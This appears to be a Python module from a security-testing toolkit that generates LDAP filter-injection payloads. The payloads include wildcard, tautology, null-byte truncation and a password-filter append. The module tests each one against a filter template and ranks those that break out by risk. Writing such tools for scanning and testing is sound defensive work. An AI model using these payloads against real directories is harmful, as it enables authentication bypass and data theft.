"""LDAP injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_ldap_context

# Filter breakout payloads. ATTR is substituted with a common attribute.
_BODIES = [
    ("*", "wildcard"),
    ("*)({attr}=*", "close-open"),
    ("*)({attr}=*))(|({attr}=*", "tautology"),
    ("*))%00", "null-truncate"),
    ("*)(|({attr}=*))", "or-tautology"),
    ("admin)(&(password=*)", "and-append"),
]

_ATTRS = ["uid", "cn"]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class LdapCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class LdapMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[LdapCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _generate() -> list[tuple[str, str]]:
    seen: set[str] = set()
    out: list[tuple[str, str]] = []
    for body, strategy in _BODIES:
        if "{attr}" in body:
            for attr in _ATTRS:
                payload = body.format(attr=attr)
                if payload not in seen:
                    seen.add(payload)
                    out.append((payload, strategy))
        elif body not in seen:
            seen.add(body)
            out.append((body, strategy))
    return out


def mutate_ldap(template: str) -> LdapMutationResult:
    """Generate and rank LDAP filter injection payloads for ``template``."""
    from .analyzer import analyze_ldap

    context = analyze_ldap_context(template)
    generated = _generate()

    candidates: list[LdapCandidate] = []
    for payload, strategy in generated:
        result = analyze_ldap(template, payload)
        b = result.breakout
        if b.command_injected or "*" in b.separators:
            candidates.append(
                LdapCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=b.command_injected,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return LdapMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
